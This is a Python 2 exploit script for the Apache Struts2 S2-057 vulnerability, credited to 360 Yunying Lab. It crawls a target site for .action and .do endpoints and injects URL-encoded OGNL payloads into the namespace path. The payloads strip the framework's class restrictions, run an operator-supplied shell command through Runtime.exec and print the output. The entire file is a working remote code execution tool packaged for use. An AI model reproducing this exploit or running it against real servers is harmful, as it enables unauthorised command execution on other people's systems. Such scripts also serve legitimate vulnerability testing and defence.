#coding: utf-8 
#author: 360云影实验室 (icematcha@360Yunyinglab, Ivan1ee@github.com)
import requests
import sys
from urlparse import urljoin, urlparse
import re


def gen_paylaod(uri, payload):
	prefix = '/'.join(uri.split('/')[:-1])
	urlpack = urlparse(sys.argv[1].strip())
	url = urlpack.scheme + '://' + urlpack.netloc + prefix + '/' + payload + uri.split(prefix)[1]
	return url

def expliot(host , command):
	def get_all_actions(host):
		resp = requests.get(host).content
		match = re.findall(r'''(?:href|action|src)\s*?=\s*?(?:"|')\s*?([^'"]*?\.(?:action|do))''', resp)
		return match

	link_list = get_all_actions(host)

	payload = '%24%7B%28%23dm%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23ct%3D%23request%5B%27struts.valueStack%27%5D.context%29.%28%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ou%3D%23cr.getInstance%28@com.opensymphony.xwork2.ognl.OgnlUtil@class%29%29.%28%23ou.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ou.getExcludedClasses%28%29.clear%28%29%29.%28%23ct.setMemberAccess%28%23dm%29%29.%28%23w%3D%23ct.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%29.%28%23w.print%28@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27'+ command +'%27%29.getInputStream%28%29%29%29%29.%28%23w.close%28%29%29%7D'
	payload1 = '%24%7B%28%23_memberAccess%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23w%3D%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%29.%28%23w.print%28@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27'+command+'%27%29.getInputStream%28%29%29%29%29.%28%23w.close%28%29%29%7D'

	for _uri in link_list:
		try:
			payload_url = gen_paylaod(_uri , payload)
			payload_url1 = gen_paylaod(_uri , payload1)

			res = requests.get(payload_url, allow_redirects=False)
			res1 = requests.get(payload_url1, allow_redirects=False)
			if res.status_code == 200 and res1.status_code != 200:
				return res.content
			elif res1.status_code == 200 and res.status_code != 200:
				return res.content
			else:
				pass
		except Exception as e:
			print e
	return None


if __name__ == '__main__':
	if len(sys.argv) < 3:
		print("Usage: python s2-057-exp.py http://www.xxx.com/ {command}")
	else:
		res = expliot(sys.argv[1].strip(), sys.argv[2])
		if res:
			print "Exploit successful:"
			print res
		else:
			print('The target is likely unvulnerable,mabye your struts2 version is too high!')

